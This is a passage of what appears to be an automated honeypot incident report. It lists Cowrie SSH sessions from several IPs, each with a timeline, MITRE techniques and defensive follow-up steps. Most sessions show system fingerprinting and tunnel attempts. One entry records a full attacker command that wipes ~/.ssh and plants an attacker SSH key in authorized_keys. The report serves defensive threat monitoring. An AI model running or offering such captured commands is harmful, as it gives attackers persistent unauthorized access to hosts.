- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2375f0998d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:29 |
| **Last Seen** | 2026-08-30 12:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:29:10` | `cowrie.session.connect` |
| `2026-08-30 12:29:11` | `cowrie.client.version` |
| `2026-08-30 12:29:11` | `cowrie.client.kex` |
| `2026-08-30 12:29:13` | `cowrie.login.success` |
| `2026-08-30 12:29:14` | `cowrie.session.params` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:14` | `cowrie.command.success` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:14` | `cowrie.command.input` |
| `2026-08-30 12:29:15` | `cowrie.log.closed` |
| `2026-08-30 12:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c142393cc171

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-08-30 12:29 |
| **Last Seen** | 2026-08-30 12:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:29:15` | `cowrie.session.connect` |
| `2026-08-30 12:29:16` | `cowrie.client.version` |
| `2026-08-30 12:29:16` | `cowrie.client.kex` |
| `2026-08-30 12:29:18` | `cowrie.login.success` |
| `2026-08-30 12:29:18` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9f1b6910af

| Field | Detail |
|---|---|
| **Source IP** | `220.246.66[.]209` |
| **First Seen** | 2026-08-30 12:29 |
| **Last Seen** | 2026-08-30 12:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:29:24` | `cowrie.session.connect` |
| `2026-08-30 12:29:25` | `cowrie.client.version` |
| `2026-08-30 12:29:25` | `cowrie.client.kex` |
| `2026-08-30 12:29:27` | `cowrie.login.success` |
| `2026-08-30 12:29:28` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.66[.]209` to AbuseIPDB if not already reported
- [ ] Block `220.246.66[.]209` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269c78b734b3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:29 |
| **Last Seen** | 2026-08-30 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:29:29` | `cowrie.session.connect` |
| `2026-08-30 12:29:29` | `cowrie.client.version` |
| `2026-08-30 12:29:29` | `cowrie.client.kex` |
| `2026-08-30 12:29:30` | `cowrie.login.success` |
| `2026-08-30 12:29:31` | `cowrie.session.params` |
| `2026-08-30 12:29:31` | `cowrie.command.input` |
| `2026-08-30 12:29:31` | `cowrie.log.closed` |
| `2026-08-30 12:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16f9e44a0d4c

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
| **First Seen** | 2026-08-30 12:30 |
| **Last Seen** | 2026-08-30 12:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:30:46` | `cowrie.session.connect` |
| `2026-08-30 12:30:47` | `cowrie.client.version` |
| `2026-08-30 12:30:47` | `cowrie.client.kex` |
| `2026-08-30 12:30:50` | `cowrie.login.success` |
| `2026-08-30 12:30:51` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:30:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4e99ea0893

| Field | Detail |
|---|---|
| **Source IP** | `31.59.89[.]50` |
| **First Seen** | 2026-08-30 12:30 |
| **Last Seen** | 2026-08-30 12:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:30:54` | `cowrie.session.connect` |
| `2026-08-30 12:30:54` | `cowrie.client.version` |
| `2026-08-30 12:30:54` | `cowrie.client.kex` |
| `2026-08-30 12:30:55` | `cowrie.login.success` |
| `2026-08-30 12:30:55` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.59.89[.]50` to AbuseIPDB if not already reported
- [ ] Block `31.59.89[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b0eb2a1d9d0

| Field | Detail |
|---|---|
| **Source IP** | `113.200.216[.]246` |
| **First Seen** | 2026-08-30 12:30 |
| **Last Seen** | 2026-08-30 12:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:30:58` | `cowrie.session.connect` |
| `2026-08-30 12:30:58` | `cowrie.client.version` |
| `2026-08-30 12:30:58` | `cowrie.client.kex` |
| `2026-08-30 12:31:01` | `cowrie.login.success` |
| `2026-08-30 12:31:02` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.200.216[.]246` to AbuseIPDB if not already reported
- [ ] Block `113.200.216[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cdc43c53b07

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:31 |
| **Last Seen** | 2026-08-30 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:31:02` | `cowrie.session.connect` |
| `2026-08-30 12:31:03` | `cowrie.client.version` |
| `2026-08-30 12:31:03` | `cowrie.client.kex` |
| `2026-08-30 12:31:04` | `cowrie.login.success` |
| `2026-08-30 12:31:06` | `cowrie.session.params` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.command.success` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.command.input` |
| `2026-08-30 12:31:06` | `cowrie.log.closed` |
| `2026-08-30 12:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89c9fdbc93e2

| Field | Detail |
|---|---|
| **Source IP** | `220.246.46[.]144` |
| **First Seen** | 2026-08-30 12:31 |
| **Last Seen** | 2026-08-30 12:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:31:04` | `cowrie.session.connect` |
| `2026-08-30 12:31:06` | `cowrie.client.version` |
| `2026-08-30 12:31:06` | `cowrie.client.kex` |
| `2026-08-30 12:31:08` | `cowrie.login.success` |
| `2026-08-30 12:31:09` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.46[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.246.46[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8740485bcbc8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:31 |
| **Last Seen** | 2026-08-30 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:31:34` | `cowrie.session.connect` |
| `2026-08-30 12:31:34` | `cowrie.client.version` |
| `2026-08-30 12:31:35` | `cowrie.client.kex` |
| `2026-08-30 12:31:35` | `cowrie.login.success` |
| `2026-08-30 12:31:36` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:31:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:31:36` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9499602b8bc0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:31 |
| **Last Seen** | 2026-08-30 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:31:42` | `cowrie.session.connect` |
| `2026-08-30 12:31:42` | `cowrie.client.version` |
| `2026-08-30 12:31:42` | `cowrie.client.kex` |
| `2026-08-30 12:31:42` | `cowrie.login.success` |
| `2026-08-30 12:31:43` | `cowrie.session.params` |
| `2026-08-30 12:31:43` | `cowrie.command.input` |
| `2026-08-30 12:31:43` | `cowrie.log.closed` |
| `2026-08-30 12:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27780beb700d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:32 |
| **Last Seen** | 2026-08-30 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:32:54` | `cowrie.session.connect` |
| `2026-08-30 12:32:54` | `cowrie.client.version` |
| `2026-08-30 12:32:54` | `cowrie.client.kex` |
| `2026-08-30 12:32:55` | `cowrie.login.success` |
| `2026-08-30 12:32:57` | `cowrie.session.params` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.command.success` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.command.input` |
| `2026-08-30 12:32:57` | `cowrie.log.closed` |
| `2026-08-30 12:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78cd712ec48e

| Field | Detail |
|---|---|
| **Source IP** | `101.126.71[.]100` |
| **First Seen** | 2026-08-30 12:32 |
| **Last Seen** | 2026-08-30 12:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:32:57` | `cowrie.session.connect` |
| `2026-08-30 12:32:57` | `cowrie.client.version` |
| `2026-08-30 12:32:57` | `cowrie.client.kex` |
| `2026-08-30 12:32:58` | `cowrie.login.success` |
| `2026-08-30 12:32:59` | `cowrie.session.params` |
| `2026-08-30 12:32:59` | `cowrie.command.input` |
| `2026-08-30 12:32:59` | `cowrie.command.failed` |
| `2026-08-30 12:32:59` | `cowrie.log.closed` |
| `2026-08-30 12:33:00` | `cowrie.session.params` |
| `2026-08-30 12:33:00` | `cowrie.command.input` |
| `2026-08-30 12:33:01` | `cowrie.session.file_download` |
| `2026-08-30 12:33:01` | `cowrie.log.closed` |
| `2026-08-30 12:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.71[.]100` to AbuseIPDB if not already reported
- [ ] Block `101.126.71[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e5d9f7956f5

| Field | Detail |
|---|---|
| **Source IP** | `101.126.71[.]100` |
| **First Seen** | 2026-08-30 12:33 |
| **Last Seen** | 2026-08-30 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:33:01` | `cowrie.session.connect` |
| `2026-08-30 12:33:01` | `cowrie.client.version` |
| `2026-08-30 12:33:01` | `cowrie.client.kex` |
| `2026-08-30 12:33:02` | `cowrie.login.success` |
| `2026-08-30 12:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.71[.]100` to AbuseIPDB if not already reported
- [ ] Block `101.126.71[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2fb172789cc

| Field | Detail |
|---|---|
| **Source IP** | `101.126.71[.]100` |
| **First Seen** | 2026-08-30 12:33 |
| **Last Seen** | 2026-08-30 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:33:03` | `cowrie.session.connect` |
| `2026-08-30 12:33:03` | `cowrie.client.version` |
| `2026-08-30 12:33:03` | `cowrie.client.kex` |
| `2026-08-30 12:33:04` | `cowrie.login.success` |
| `2026-08-30 12:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.71[.]100` to AbuseIPDB if not already reported
- [ ] Block `101.126.71[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-201bee7b3d2c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:33 |
| **Last Seen** | 2026-08-30 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:33:36` | `cowrie.session.connect` |
| `2026-08-30 12:33:36` | `cowrie.client.version` |
| `2026-08-30 12:33:37` | `cowrie.client.kex` |
| `2026-08-30 12:33:37` | `cowrie.login.success` |
| `2026-08-30 12:33:38` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:33:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:33:38` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84818ee35d09

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:34 |
| **Last Seen** | 2026-08-30 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:34:04` | `cowrie.session.connect` |
| `2026-08-30 12:34:04` | `cowrie.client.version` |
| `2026-08-30 12:34:04` | `cowrie.client.kex` |
| `2026-08-30 12:34:04` | `cowrie.login.success` |
| `2026-08-30 12:34:05` | `cowrie.session.params` |
| `2026-08-30 12:34:05` | `cowrie.command.input` |
| `2026-08-30 12:34:05` | `cowrie.log.closed` |
| `2026-08-30 12:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3403a604742

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:34 |
| **Last Seen** | 2026-08-30 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:34:55` | `cowrie.session.connect` |
| `2026-08-30 12:34:55` | `cowrie.client.version` |
| `2026-08-30 12:34:55` | `cowrie.client.kex` |
| `2026-08-30 12:34:56` | `cowrie.login.success` |
| `2026-08-30 12:34:57` | `cowrie.session.params` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:57` | `cowrie.command.success` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:57` | `cowrie.command.input` |
| `2026-08-30 12:34:58` | `cowrie.log.closed` |
| `2026-08-30 12:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-222e373c418e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:36 |
| **Last Seen** | 2026-08-30 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:36:23` | `cowrie.session.connect` |
| `2026-08-30 12:36:23` | `cowrie.client.version` |
| `2026-08-30 12:36:23` | `cowrie.client.kex` |
| `2026-08-30 12:36:23` | `cowrie.login.success` |
| `2026-08-30 12:36:24` | `cowrie.session.params` |
| `2026-08-30 12:36:24` | `cowrie.command.input` |
| `2026-08-30 12:36:24` | `cowrie.log.closed` |
| `2026-08-30 12:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ce889c1eb9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:36 |
| **Last Seen** | 2026-08-30 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
